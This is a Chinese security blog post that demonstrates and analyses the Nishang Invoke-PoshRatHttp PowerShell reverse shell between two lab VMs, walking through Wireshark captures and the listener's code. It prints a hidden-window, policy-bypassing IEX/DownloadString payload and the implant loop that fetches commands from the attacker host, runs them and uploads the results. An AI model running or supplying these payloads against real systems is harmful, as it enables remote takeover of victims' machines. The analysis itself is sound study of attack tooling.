> 原文链接: https://www.anquanke.com//post/id/186953 


# Powershell 进阶——基于Powershell的远控分析


                                阅读量   
                                **655480**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01dc4cad67f5b012a3.png)](https://p1.ssl.qhimg.com/t01dc4cad67f5b012a3.png)



## 前言

我是掌控安全学院的魔术手，这篇文章是对Powershell的远控进行分析。

之前写过一篇文章《badusb-轻松绕过防护拿下小姐姐的电脑》，其实那篇文章本打算写三个要点：思路、绕过和远控分析，但是因为篇幅太长，所以把远控分析放到这篇文章。



## 远控演示

先来个比较简单的远控，来自[Nishang](https://github.com/zkaq-mss/nishang)的反弹shell：Invoke-PoshRatHttp.ps1。这里为了演示方便，我用了两台win10的虚拟机，分别作为攻击机和靶机。<br>
准备工作：
<li>两台WIN10的虚拟机(Nishang需要的环境是Powershell 3.0以上)。<br>
攻击机：mss-192.168.1.237<br>
靶机：target-192.168.1.48</li>
1. 攻击机下载Nishang，Nishang是一款基于Powershell的渗透测试工具，里面集成了很多功能，比如下载、键盘记录、远控等脚本，我们这里只需要用他的基于HTTP的反弹shell：Invoke-PoshRatHttp.ps1，只下载这一个也行。
准备工作完成后，攻击机以管理员身份打开Powershell,输入：`. C:nishang-masterShellsInvoke-PoshRatHttp.ps1`。

注意 `.` 和后面的路径之间有个空格，`C:nishang-masterShellsInvoke-PoshRatHttp.ps1`是下载后脚本所在的路径。

输入完成后会爆出提示,输入`R`继续。

```
PS C:Windowssystem32&gt; . C:nishang-masterShellsInvoke-PoshRatHttp.ps1

安全警告
请只运行你信任的脚本。虽然来自 Internet 的脚本会有一定的用处，但此脚本可能会损坏你的计算机。如果你信任此脚本，请使用
Unblock-File cmdlet 允许运行该脚本，而不显示此警告消息。是否要运行 C:nishang-masterShellsInvoke-PoshRatHttp.ps1?
[D] 不运行(D)  [R] 运行一次(R)  [S] 暂停(S)  [?] 帮助 (默认值为“D”):
```

然后输入`Invoke-PoshRatHttp 192.168.1.237 3333`。

注意：`192.168.1.237`是攻击机的IP，`3333`是侦听的端口。输入完成后会显示下列内容：

```
PS C:Windowssystem32&gt; Invoke-PoshRatHttp 192.168.1.237 3333
Listening on 192.168.1.237:3333
Run the following command on the target:
powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.237:3333/connect'))
```

接下来只需将`powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.237:3333/connect'))`在靶机上运行即可。注意，建议将这串代码先放到编辑器里把一些回车去掉，否则容易出问题。<br>
靶机执行后会得到如下回显：

```
PS 192.168.1.48:50330&gt;:
```

输入`exit`退出。

整体流程如图：

[![](https://raw.githubusercontent.com/zkaq-mss/shell/master/1.png)](https://raw.githubusercontent.com/zkaq-mss/shell/master/1.png)



## 远控分析

远控分析分成两个部分：
- 第一部分是建立连接，包括生成payload和靶机执行后建立连接的过程。
- 第二部分是命令执行，是你攻击机执行指令并返回的过程。
### <a class="reference-link" name="%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5"></a>建立连接

首先通过wireshark看看整个过程发生了什么。

打开wireshark监听，因为这是一个基于HTTP的反弹shell，所以只需要抓取两台机器通信中的HTTP包，抓取结果如下图。

[![](https://raw.githubusercontent.com/zkaq-mss/shell/master/2.png)](https://raw.githubusercontent.com/zkaq-mss/shell/master/2.png)

从图中可以看出，靶机执行payload之后，靶机向攻击机发送了第一次请求，追踪http流后发现内容如图:

[![](https://raw.githubusercontent.com/zkaq-mss/shell/master/3.png)](https://raw.githubusercontent.com/zkaq-mss/shell/master/3.png)

从图中分析可知，靶机发出HTTP请求`http://192.168.1.237:3333/connect`,攻击机返回了下列内容：

```
$s = "http://192.168.1.237:3333/rat"
$w = New-Object Net.WebClient 
while($true)
`{`
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = `{`$true`}`
    $r = $w.DownloadString($s)
    while($r) 
    `{`
        $o = invoke-expression $r | out-string 
        $w.UploadString($s, $o)    
        break
    `}`
`}`
```

这个内容就是远控的被控端的内容。

先对这个过程进行分析：
<li>攻击机执行`Invoke-PoshRatHttp.ps1`脚本，打开该脚本，在第35-37行定义了两个位置参数`IPAddress`和`port`,也就是我们执行时输入的ip和侦听的端口。<br>[![](https://raw.githubusercontent.com/zkaq-mss/shell/master/4.png)](https://raw.githubusercontent.com/zkaq-mss/shell/master/4.png)
</li>
<li>在第66生成了`System.Net.HttpListener`,这是一个基于http的侦听器；第71行创建了一个防火墙规则，第70行是为了防止该规则已存在，所以先删除它，防止出现问题；第73行表示侦听器开始工作；第74-76行是输出提醒内容和payload。<br>[![](https://raw.githubusercontent.com/zkaq-mss/shell/master/5.png)](https://raw.githubusercontent.com/zkaq-mss/shell/master/5.png)
</li>
<li>执行payload：powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(‘[http://192.168.1.237:3333/connect](http://192.168.1.237:3333/connect)‘))<br>
这个payload的大意就是模拟成一个web客户端去下载文件`http://192.168.1.237:3333/connect`,然后执行这个文件。这就是监听看到的第一个数据包，由靶机发起。</li>
<li>攻击机收到请求后，对请求的内容进行分析，在脚本的第85行有一个判断，`if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET"))`意思是如果收到一个url里有`connect`的GET请求，就执行下面的指令，也就是将被控端发送个靶机。这是监听看到的第二个包，由攻击机发送给靶机。<br>[![](https://raw.githubusercontent.com/zkaq-mss/shell/master/6-1.png)](https://raw.githubusercontent.com/zkaq-mss/shell/master/6-1.png)
</li>
<li>靶机收到数据包后，执行其功能:第91行生成一个web客户端，然后通过这个客户端去请求`http://192.168.1.237:3333/rat`的内容。这就是图中的第三个数据包，由靶机发送给攻击机。<br><h3 name="h3-4" id="h3-4">
<a class="reference-link" name="%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"></a>命令执行</h3>
<p>攻击机执行`whoami`,使用wireshark监听，结果如图:<br>[![](https://raw.githubusercontent.com/zkaq-mss/shell/master/7.png)](https://raw.githubusercontent.com/zkaq-mss/shell/master/7.png)追踪http流结果如图：<br>[![](https://raw.githubusercontent.com/zkaq-mss/shell/master/8.png)](https://raw.githubusercontent.com/zkaq-mss/shell/master/8.png)从中可以看出，攻击机将指令`whoami`发送给靶机，靶机执行后发送给攻击机。<br>
接下来对这个过程进行分析：</p>
</li>
1. 攻击机输入指令`whoami`,脚本将指令传递给 `$message`。
1. 因为第一步的第三个包是请求`/rat`,根据脚本的第109行可知，接下来将执行110-120行的内容，其中第114行是对输入的指令做出分析，如果输入的指令是`exit`,那么将退出侦听。<br>[![](https://raw.githubusercontent.com/zkaq-mss/shell/master/9-1.png)](https://raw.githubusercontent.com/zkaq-mss/shell/master/9-1.png)如果输入的指令不是`exit`,那么程序继续执行，在第160-167行，将指令处理后发送给靶机。<br>[![](https://raw.githubusercontent.com/zkaq-mss/shell/master/10.png)](https://raw.githubusercontent.com/zkaq-mss/shell/master/10.png)这就是第一个数据包。
1. 靶机收到后，将指令`whoami`传递给变量`$r`,然后由`invoke-expression`执行指令，将结果传递给变量`$o`然后上传给靶机，靶机处理后显示出来。
上面就是对整个过程的分析，最后放出一张完整的图。

[![](https://raw.githubusercontent.com/zkaq-mss/shell/master/11.png)](https://raw.githubusercontent.com/zkaq-mss/shell/master/11.png)
